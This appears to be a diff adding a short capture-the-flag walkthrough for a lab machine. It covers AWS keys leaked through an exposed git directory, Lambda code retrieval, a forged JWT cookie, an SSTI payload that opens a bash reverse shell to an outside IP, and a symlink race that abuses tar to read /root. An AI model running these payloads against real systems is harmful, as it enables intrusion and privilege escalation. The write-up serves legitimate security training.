@@ -1,0 +1,52 @@
+we found a login page but no creds
+
+it had a git directory from which we got aws access key id and key
+
+```
+aws configure
+AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
+AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+Default region name [None]: us-east-1
+Default output format [None]:
+```
+
+after getting details we filled it
+
+then we listed functions to get them
+
+==aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb==
+
+now we set them to get code which we can download on pc
+
+==aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb==
+
+it had a secret for the website
+
+we created a cookie
+
+```
+import jwt
+>>> secret = "RrXCv`mrNe!K!4+5`wYq"
+>>> jwt.encode({"username":"0xdf"}, secret, algorithm='HS256')
+b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjB4ZGYifQ.0kQYuCxPdN6bYT66kYg3lF-fjFRU9YvI30hNN4t77RE'
+```
+
+now we got a ssti on the page in email
+
+{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.14.10/5555 0>%261"').read() }}
+
+and got a shell
+
+root part
+
+we ran pspy and found tar doing -xvf at some file
+
+which means it follow symlinks
+
+```
+while :; do if test -f checksum; then rm -f checksum; ln -s /root checksum; echo "Replaced checksum"; sleep 5; echo "Backup probably done now"; break; fi; sleep 1; done
+```
+
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+
+this was tar doing
